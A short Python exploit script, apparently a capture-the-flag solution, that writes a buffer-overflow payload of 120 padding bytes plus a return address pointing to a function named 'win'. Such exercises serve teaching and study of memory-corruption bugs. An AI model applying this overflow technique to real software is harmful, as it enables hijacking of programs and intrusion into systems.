#!/usr/bin/env python3

from struct import pack

payload = b'a' * 120

# The address of the function win
payload += pack("<Q", 0x40180c)

with open("payload", "wb") as f:
    f.write(payload)